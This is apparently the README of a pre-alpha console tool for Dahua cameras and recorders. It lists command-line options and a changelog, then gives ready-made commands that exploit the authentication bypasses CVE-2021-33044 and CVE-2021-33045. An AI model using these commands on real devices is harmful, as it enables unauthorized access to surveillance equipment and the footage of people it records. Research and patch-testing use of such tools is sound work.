# Dahua Console

- Version: Pre-alpha
- Bugs: Indeed
- TODO: Lots of stuff

[Install requirements]
```text
sudo pip3 install -r requirements.txt
```

[Arguments]
```text
  -h, --help            show this help message and exit
  --rhost RHOST         Remote Target Address (IP/FQDN)
  --rport RPORT         Remote Target Port
  --proto {dhip,dvrip,3des,http,https}
                        Protocol [Default: dvrip]
  --relay RELAY         ssh://<username>:<password>@<host>:<port>
  --auth AUTH           Credentials (username:password) [Default: None]
  --ssl                 Use SSL for remote connection
  -d, --debug           JSON traffic
  -dd, --ddebug         hexdump traffic
  --dump {config,service,device,discover,log,test}
                        Dump remote config
  --dump_argv DUMP_ARGV
                        ARGV to --dump
  --test                test w/o login attempt
  --multihost           Connect hosts from "dhConsole.json"
  --save                Save host hash to "dhConsole.json"
  --events              Subscribe to events [Default: False]
  --discover {dhip,dvrip}
                        Discover local devices
  --logon {wsse,loopback,netkeyboard,onvif:plain,onvif:digest,onvif:onvif,plain,ushield,ldap,ad,cms,local,rtsp,basic,old_digest,gui}
                        Logon types
  -f, --force           Bypass stops for dangerous commands
  --calls               Debug internal calls
```
---
[Release]

[Update]
2022-07-10

- Added 3des_old logon method for VTH1510CH running V2 software from 2016
  - Minor difference in the login packet data
  - Do not query device parameters on connect - will reset the connection
- Added `--restore config-file.json`
  - Loads json configuration file or parts thereof.

Example:

`./Console.py --rhost 192.168.1.x --proto 3des --auth admin:admin  --logon old_3des --dump config`

[Update]

2021-10-07

Details here: https://github.com/mcw0/PoC/blob/master/Dahua%20authentication%20bypass.txt

2021-10-06


[CVE-2021-33044]

Protocol needed: DHIP or HTTP/HTTPS (DHIP do not work with TLS/SSL @TCP/443)
```text
[proto: dhip, normally using tcp/5000]
./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto dhip --rport 5000

[proto: dhip, usually working with HTTP port as well]
./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto dhip --rport 80

[proto: http/https]
./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto http --rport 80
./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto https --rport 443
```

[CVE-2021-33045]

Protocol needed: DHIP (DHIP do not work with TLS/SSL @TCP/443)
```text
[proto: dhip, normally using tcp/5000]
./Console.py --logon loopback --rhost 192.168.57.20 --proto dhip --rport 5000

[proto: dhip, usually working with HTTP port as well]
./Console.py --logon loopback --rhost 192.168.57.20 --proto dhip --rport 80
```
---

